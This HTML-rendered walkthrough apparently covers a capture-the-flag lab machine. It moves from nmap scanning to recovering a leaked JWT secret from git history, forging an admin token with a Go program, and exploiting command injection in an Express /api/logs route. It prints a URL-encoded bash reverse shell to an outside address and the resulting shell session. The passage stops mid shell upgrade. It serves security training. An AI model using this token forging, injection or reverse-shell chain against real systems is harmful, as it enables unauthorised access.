</span></span><span class=line><span class=cl>nmap -p 22,80,3000 -sC -sV -oA nmap/all-tcp-ports-secret 10.10.11.120
</span></span><span class=line><span class=cl>Starting Nmap 7.91 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-10-30 23:20 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.120
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.073s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp   open  http    nginx 1.18.0 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: nginx/1.18.0 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: DUMB Docs
</span></span><span class=line><span class=cl>3000/tcp open  http    Node.js <span class=o>(</span>Express middleware<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: DUMB Docs
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 17.04 seconds
</span></span></code></pre></div><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-80---website>TCP 80 - Website<a class=anchor aria-hidden=true href=#tcp-80---website>#</a></h3><p>Visiting the web on port 80 shows an online API documentation page called &ldquo;DUMBDocs&rdquo;.</p><p><div class=img-container><img src=imgs/image-20220926161011625.png alt=image-20220926161011625></div></p><p>The Live Demo button points to <code>/api/</code>, but it&rsquo;s a 404.</p><p><div class=img-container><img src=imgs/image-20211031105210501.png alt=image-20211031105210501></div></p><p>At the bottom of the page, there&rsquo;s a button to download the API source code and I&rsquo;ll grab it.</p><p><div class=img-container><img src=imgs/image-20211031104419915.png alt=image-20211031104419915></div></p><p>Clicking on any of the available card menus (introduction, installation, etc.) redirects to <code>/docs</code>, which in this section it explains how to use the API.</p><p><div class=img-container><img src=imgs/image-20211031110930866.png alt=image-20211031110930866></div></p><p>Some sections contain <em>lorem ipsum</em> text, some are not. That should be the hint where to go further</p><h3 id=tcp-3000---website>TCP 3000 - Website<a class=anchor aria-hidden=true href=#tcp-3000---website>#</a></h3><p>On port 3000, it serves the same site as on port 80, but it served by <code>node.js</code> not <code>NGINX</code>.</p><p><div class=img-container><img src=imgs/image-20211031110717336.png alt=image-20211031110717336></div></p><p>From here, I&rsquo;ll look into the API.</p><h3 id=api>API<a class=anchor aria-hidden=true href=#api>#</a></h3><h4 id=register>Register<a class=anchor aria-hidden=true href=#register>#</a></h4><p>According to the documentation (<code>/docs</code>), I can register a user by sending API request to <code>/api/user/register</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «secret» «10.10.14.28» 
</span></span><span class=line><span class=cl>$ curl -H <span class=s1>&#39;Content-Type: application/json&#39;</span> -d <span class=s1>&#39;{&#34;name&#34;: &#34;syncrst&#34;,&#34;email&#34;: &#34;syncrst1@secret.com&#34;,&#34;password&#34;: &#34;syncrst&#34;}&#39;</span> http://secret.htb:3000/api/user/register
</span></span><span class=line><span class=cl><span class=o>{</span><span class=s2>&#34;user&#34;</span>:<span class=s2>&#34;syncrst&#34;</span><span class=o>}</span>
</span></span></code></pre></div><p>The response returns my username and that means the registration was successful.</p><h4 id=login---jwt-token>Login -> JWT token<a class=anchor aria-hidden=true href=#login---jwt-token>#</a></h4><p>Now that I&rsquo;ve been registered, I can login to get a <a href=https://jwt.io/introduction>JWT token</a> by sending API request to <code>/api/user/login</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «secret» «10.10.14.28» 
</span></span><span class=line><span class=cl>$ curl -H <span class=s1>&#39;Content-Type: application/json&#39;</span> -d <span class=s1>&#39;{&#34;email&#34;: &#34;syncrst1@secret.com&#34;,&#34;password&#34;: &#34;syncrst&#34;}&#39;</span> http://secret.htb:3000/api/user/login 
</span></span><span class=line><span class=cl>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MzMxYzk5OGJkMDdlMGQ3YTU1ODcyOGYiLCJuYW1lIjoic3luY3JzdCIsImVtYWlsIjoic3luY3JzdDFAc2VjcmV0LmNvbSIsImlhdCI6MTY2NDIwNzU5OX0.VGfQxKW8DbdCCWGTeyEo6MAHhOkEqeaW-IBvyaik4oc
</span></span></code></pre></div><p>The payload data of this JWT can be seen with <a href=https://jwt.io>jwt.io</a>.</p><p><div class=img-container><img src=imgs/image-20220927133742256.png alt=image-20220927133742256></div></p><h4 id=private-route>Private Route<a class=anchor aria-hidden=true href=#private-route>#</a></h4><p>The last API route in this docs is <code>/api/priv</code>. I can use the auth token I got on this route, where it basically just checks for user role or privilege.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «secret» «10.10.14.28» 
</span></span><span class=line><span class=cl>$ curl -sH <span class=s1>&#39;Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MzMxYzk5OGJkMDdlMGQ3YTU1ODcyOGYiLCJuYW1lIjoic3luY3JzdCIsImVtYWlsIjoic3luY3JzdDFAc2VjcmV0LmNvbSIsImlhdCI6MTY2NDIwNzU5OX0.VGfQxKW8DbdCCWGTeyEo6MAHhOkEqeaW-IBvyaik4oc&#39;</span> http://secret.htb:3000/api/priv <span class=p>|</span> jq
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;role&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;role&#34;</span>: <span class=s2>&#34;you are normal user&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;desc&#34;</span>: <span class=s2>&#34;syncrst&#34;</span>
</span></span><span class=line><span class=cl>  <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></div><p>It&rsquo;s still vague what to do with this API, so I&rsquo;ll look into the source code.</p><h3 id=source-code-analysis>Source Code Analysis<a class=anchor aria-hidden=true href=#source-code-analysis>#</a></h3><h4 id=directory-structure>Directory Structure<a class=anchor aria-hidden=true href=#directory-structure>#</a></h4><p>The source code has the typical structure of <code>node.js</code> application</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «loot» «10.10.14.28» 
</span></span><span class=line><span class=cl>$ tree -L <span class=m>2</span> . 
</span></span><span class=line><span class=cl>.
</span></span><span class=line><span class=cl>├── files.zip
</span></span><span class=line><span class=cl>└── local-web
</span></span><span class=line><span class=cl>    ├── index.js
</span></span><span class=line><span class=cl>    ├── model
</span></span><span class=line><span class=cl>    ├── node_modules
</span></span><span class=line><span class=cl>    ├── package.json
</span></span><span class=line><span class=cl>    ├── package-lock.json
</span></span><span class=line><span class=cl>    ├── public
</span></span><span class=line><span class=cl>    ├── routes
</span></span><span class=line><span class=cl>    ├── src
</span></span><span class=line><span class=cl>    └── validations.js
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>7</span> directories, <span class=m>5</span> files
</span></span></code></pre></div><h4 id=commit-history>Commit History<a class=anchor aria-hidden=true href=#commit-history>#</a></h4><p>When I enter the <code>local-web</code> directory, my git plugin is activated, which indicates it contains git objects. It&rsquo;s worth to start with git first.</p><p>Running <code>git log</code> shows the commit history, author and email address.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «local-web» «10.10.14.28» git:<span class=o>(</span>master<span class=o>)</span> ✗ 
</span></span><span class=line><span class=cl>$ git log 
</span></span><span class=line><span class=cl>commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b
</span></span><span class=line><span class=cl>Author: dasithsv &lt;dasithsv@gmail.com&gt;
</span></span><span class=line><span class=cl>Date:   Thu Sep <span class=m>9</span> 00:03:27 <span class=m>2021</span> +0530
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    now we can view logs from server 😃
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
</span></span><span class=line><span class=cl>Author: dasithsv &lt;dasithsv@gmail.com&gt;
</span></span><span class=line><span class=cl>Date:   Fri Sep <span class=m>3</span> 11:30:17 <span class=m>2021</span> +0530
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    removed .env <span class=k>for</span> security reasons
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>commit de0a46b5107a2f4d26e348303e76d85ae4870934
</span></span><span class=line><span class=cl>Author: dasithsv &lt;dasithsv@gmail.com&gt;
</span></span><span class=line><span class=cl>Date:   Fri Sep <span class=m>3</span> 11:29:19 <span class=m>2021</span> +0530
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    added /downloads
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>commit 4e5547295cfe456d8ca7005cb823e1101fd1f9cb
</span></span><span class=line><span class=cl>Author: dasithsv &lt;dasithsv@gmail.com&gt;
</span></span><span class=line><span class=cl>Date:   Fri Sep <span class=m>3</span> 11:27:35 <span class=m>2021</span> +0530
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    removed swap
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>commit 3a367e735ee76569664bf7754eaaade7c735d702
</span></span><span class=line><span class=cl>Author: dasithsv &lt;dasithsv@gmail.com&gt;
</span></span><span class=line><span class=cl>Date:   Fri Sep <span class=m>3</span> 11:26:39 <span class=m>2021</span> +0530
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    added downloads
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8
</span></span><span class=line><span class=cl>Author: dasithsv &lt;dasithsv@gmail.com&gt;
</span></span><span class=line><span class=cl>Date:   Fri Sep <span class=m>3</span> 11:25:52 <span class=m>2021</span> +0530
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    first commit
</span></span></code></pre></div><p>Commit <code>67d8da7</code> seems interesting. When comparing it with commit <code>de0a46b</code>, there&rsquo;s a deleted secret token.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «local-web» «10.10.14.28» git:<span class=o>(</span>master<span class=o>)</span> ✗ 
</span></span><span class=line><span class=cl>$ git diff 67d8da7 de0a46b <span class=p>|</span> cat
</span></span><span class=line><span class=cl>diff --git a/.env b/.env
</span></span><span class=line><span class=cl>index 31db370..fb6f587 <span class=m>100644</span>
</span></span><span class=line><span class=cl>--- a/.env
</span></span><span class=line><span class=cl>+++ b/.env
</span></span><span class=line><span class=cl>@@ -1,2 +1,2 @@
</span></span><span class=line><span class=cl> <span class=nv>DB_CONNECT</span> <span class=o>=</span> <span class=s1>&#39;mongodb://127.0.0.1:27017/auth-web&#39;</span>
</span></span><span class=line><span class=cl>-TOKEN_SECRET <span class=o>=</span> secret
</span></span><span class=line><span class=cl>+TOKEN_SECRET <span class=o>=</span> gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
</span></span></code></pre></div><p>I&rsquo;ll note that secret token.</p><h4 id=web-routes>Web Routes<a class=anchor aria-hidden=true href=#web-routes>#</a></h4><p>Looking at the <code>index.js</code> file, there are three defined routes: <code>privRoute</code>, <code>authRoute</code>, and <code>webroute</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl>const <span class=nv>privRoute</span> <span class=o>=</span> require<span class=o>(</span><span class=s1>&#39;./routes/private&#39;</span><span class=o>)</span> <span class=c1># location: routes/private.js</span>
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl>// import routs 
</span></span><span class=line><span class=cl>const <span class=nv>authRoute</span> <span class=o>=</span> require<span class=o>(</span><span class=s1>&#39;./routes/auth&#39;</span><span class=o>)</span><span class=p>;</span> <span class=c1># location: routes/auth.js</span>
</span></span><span class=line><span class=cl>const <span class=nv>webroute</span> <span class=o>=</span> require<span class=o>(</span><span class=s1>&#39;./src/routes/web&#39;</span><span class=o>)</span> <span class=c1># location: src/routes/web.js</span>
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl>//middle ware 
</span></span><span class=line><span class=cl>app.use<span class=o>(</span>express.json<span class=o>())</span><span class=p>;</span>
</span></span><span class=line><span class=cl>app.use<span class=o>(</span><span class=s1>&#39;/api/user&#39;</span>,authRoute<span class=o>)</span>
</span></span><span class=line><span class=cl>app.use<span class=o>(</span><span class=s1>&#39;/api/&#39;</span>, privRoute<span class=o>)</span>
</span></span><span class=line><span class=cl>app.use<span class=o>(</span><span class=s1>&#39;/&#39;</span>, webroute<span class=o>)</span>
</span></span></code></pre></div><p><code>webroute</code> is the router that handles the documentation web while <code>authRoute</code> is the router that handles the API for user registration (<code>/api/user/register</code>) and login (<code>/api/user/login</code>) .</p><p>As for <code>privRoute</code>, it handles the API for private route (<code>/api/priv</code>). But, there&rsquo;s a hidden route <code>/api/logs</code> that wasn&rsquo;t listed in the API documentation. What&rsquo;s more interesting is that <code>/api/logs</code> route is vulnerable to command injection only if I pass the verification as user <code>theadmin</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>router</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/logs&#39;</span><span class=p>,</span> <span class=nx>verifytoken</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>file</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>query</span><span class=p>.</span><span class=nx>file</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>userinfo</span> <span class=o>=</span> <span class=p>{</span> <span class=nx>name</span><span class=o>:</span> <span class=nx>req</span><span class=p>.</span><span class=nx>user</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>name</span> <span class=o>=</span> <span class=nx>userinfo</span><span class=p>.</span><span class=nx>name</span><span class=p>.</span><span class=nx>name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>name</span> <span class=o>==</span> <span class=s1>&#39;theadmin&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>getLogs</span> <span class=o>=</span> <span class=sb>`git log --oneline </span><span class=si>${</span><span class=nx>file</span><span class=si>}</span><span class=sb>`</span><span class=p>;</span> <span class=err>#</span> <span class=nx>command</span> <span class=nx>injection</span>
</span></span><span class=line><span class=cl>        <span class=nx>exec</span><span class=p>(</span><span class=nx>getLogs</span><span class=p>,</span> <span class=p>(</span><span class=nx>err</span> <span class=p>,</span> <span class=nx>output</span><span class=p>)</span> <span class=p>=&gt;{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=nx>err</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>500</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=nx>err</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=nx>res</span><span class=p>.</span><span class=nx>json</span><span class=p>(</span><span class=nx>output</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>res</span><span class=p>.</span><span class=nx>json</span><span class=p>({</span>
</span></span><span class=line><span class=cl>            <span class=nx>role</span><span class=o>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>role</span><span class=o>:</span> <span class=s2>&#34;you are normal user&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=nx>desc</span><span class=o>:</span> <span class=nx>userinfo</span><span class=p>.</span><span class=nx>name</span><span class=p>.</span><span class=nx>name</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>})</span>
</span></span></code></pre></div><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=shell-as-dasith>Shell as dasith<a class=anchor aria-hidden=true href=#shell-as-dasith>#</a></h3><h4 id=forging-admin-token>Forging Admin Token<a class=anchor aria-hidden=true href=#forging-admin-token>#</a></h4><p>With the secret token obtained, I&rsquo;ll write a program to forge valid JWT token for user <code>theadmin</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=kn>package</span> <span class=nx>main</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;fmt&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>jwt</span> <span class=s>&#34;github.com/dgrijalva/jwt-go&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>claims</span> <span class=o>:=</span> <span class=kd>struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>ID</span>    <span class=kt>string</span> <span class=s>`json:&#34;_id,omitempty&#34;`</span>
</span></span><span class=line><span class=cl>		<span class=nx>Name</span>  <span class=kt>string</span> <span class=s>`json:&#34;name,omitempty&#34;`</span>
</span></span><span class=line><span class=cl>		<span class=nx>Email</span> <span class=kt>string</span> <span class=s>`json:&#34;email,omitempty&#34;`</span>
</span></span><span class=line><span class=cl>		<span class=nx>jwt</span><span class=p>.</span><span class=nx>StandardClaims</span>
</span></span><span class=line><span class=cl>	<span class=p>}{</span>
</span></span><span class=line><span class=cl>		<span class=nx>ID</span><span class=p>:</span>    <span class=s>&#34;6114654d77f9a54e00f05777&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=nx>Name</span><span class=p>:</span>  <span class=s>&#34;theadmin&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=nx>Email</span><span class=p>:</span> <span class=s>&#34;root@dasith.works&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>token</span> <span class=o>:=</span> <span class=nx>jwt</span><span class=p>.</span><span class=nf>NewWithClaims</span><span class=p>(</span><span class=nx>jwt</span><span class=p>.</span><span class=nx>SigningMethodHS256</span><span class=p>,</span> <span class=nx>claims</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>secret</span> <span class=o>:=</span> <span class=s>&#34;gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE&#34;</span>
</span></span><span class=line><span class=cl>	<span class=nx>signedToken</span><span class=p>,</span> <span class=nx>_</span> <span class=o>:=</span> <span class=nx>token</span><span class=p>.</span><span class=nf>SignedString</span><span class=p>([]</span><span class=nb>byte</span><span class=p>(</span><span class=nx>secret</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=nx>fmt</span><span class=p>.</span><span class=nf>Printf</span><span class=p>(</span><span class=s>&#34;%s&#34;</span><span class=p>,</span> <span class=nx>signedToken</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>I&rsquo;ll run the program to get the auth token.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «exploits» «10.10.14.28»
</span></span><span class=line><span class=cl>$ go run forge-jwt.go
</span></span><span class=line><span class=cl>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIn0.TKKattF_Exm2kXW4PQOo9jyrW0cMYuQkiQWP7DuhPn0
</span></span></code></pre></div><p>Now I can verify if that token works by accessing the <code>/api/priv</code> route</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «exploits» «10.10.14.28»
</span></span><span class=line><span class=cl>$  curl -s -H <span class=s1>&#39;Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfa...[SNIP]...Pn0&#39;</span> <span class=s2>&#34;http://secret.htb:3000/api/priv&#34;</span> <span class=p>|</span> jq
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;creds&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;role&#34;</span>: <span class=s2>&#34;admin&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;username&#34;</span>: <span class=s2>&#34;theadmin&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;desc&#34;</span>: <span class=s2>&#34;welcome back admin,&#34;</span>
</span></span><span class=line><span class=cl>  <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></div><h4 id=command-injection>Command Injection<a class=anchor aria-hidden=true href=#command-injection>#</a></h4><p>With admin token, I can access the <code>/api/logs</code> route.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>router</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/logs&#39;</span><span class=p>,</span> <span class=nx>verifytoken</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>file</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>query</span><span class=p>.</span><span class=nx>file</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>...[</span><span class=nx>SNIP</span><span class=p>]...</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>name</span> <span class=o>==</span> <span class=s1>&#39;theadmin&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>getLogs</span> <span class=o>=</span> <span class=sb>`git log --oneline </span><span class=si>${</span><span class=nx>file</span><span class=si>}</span><span class=sb>`</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>exec</span><span class=p>(</span><span class=nx>getLogs</span><span class=p>,</span> <span class=p>(</span><span class=nx>err</span> <span class=p>,</span> <span class=nx>output</span><span class=p>)</span> <span class=p>=&gt;{</span>
</span></span><span class=line><span class=cl>     <span class=k>if</span><span class=p>(</span><span class=nx>err</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>500</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=nx>err</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=k>return</span>
</span></span><span class=line><span class=cl>     <span class=p>}</span>
</span></span><span class=line><span class=cl>       <span class=nx>res</span><span class=p>.</span><span class=nx>json</span><span class=p>(</span><span class=nx>output</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>})</span>
</span></span><span class=line><span class=cl><span class=p>...[</span><span class=nx>SNIP</span><span class=p>]...</span>
</span></span></code></pre></div><p>This route takes one query: <code>file</code>, where its value then get passed into <code>getLogs</code> and eventually executed as OS command in the <code>exec()</code> function. Knowing this, I can inject OS command in the <code>file</code> query with <code>|</code> (pipe):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «exploits» «10.10.14.28»
</span></span><span class=line><span class=cl>$ curl -s -H <span class=s1>&#39;Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfa...[SNIP]...Pn0&#39;</span> <span class=s2>&#34;http://secret.htb:3000/api/logs?file=%3E%2fdev%2fnull|uname%20-a&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;Linux secret 5.4.0-89-generic #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\n&#34;</span>
</span></span></code></pre></div><p>And that worked.</p><blockquote><p>the <code>></code> and <code>/</code> symbols are URL encoded.</p></blockquote><h4 id=reverse-shell>Reverse Shell<a class=anchor aria-hidden=true href=#reverse-shell>#</a></h4><p>This time I&rsquo;ll setup a netcat listener and send URL-encoded bash reverse shell</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «exploits» «10.10.14.28»
</span></span><span class=line><span class=cl>$ curl -s -H <span class=s1>&#39;Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfa...[SNIP]...Pn0&#39;</span> <span class=s2>&#34;http://secret.htb:3000/api/logs?file=%3E%2fdev%2fnull|bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.28%2F88%200%3E%261%22&#34;</span>
</span></span></code></pre></div><p>On my listener:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «~» «10.10.14.28»
</span></span><span class=line><span class=cl>$ nc -nvlp <span class=m>88</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>88</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.28<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.11.120<span class=o>]</span> <span class=m>46050</span>
</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>2131<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>dasith@secret:~/local-web$ id
</span></span><span class=line><span class=cl>id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>dasith<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>dasith<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>dasith<span class=o>)</span>
</span></span><span class=line><span class=cl>dasith@secret:~/local-web$
</span></span></code></pre></div><p>I&rsquo;ll upgrade my shell so it can be more interactive</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>dasith@secret:~/local-web$ script /dev/null -c bash
</span></span><span class=line><span class=cl>script /dev/null -c bash
</span></span><span class=line><span class=cl>Script started, file is /dev/null
</span></span><span class=line><span class=cl>dasith@secret:~/local-web$ <span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span><span class=line><span class=cl>dasith@secret:~/local-web$ ^Z
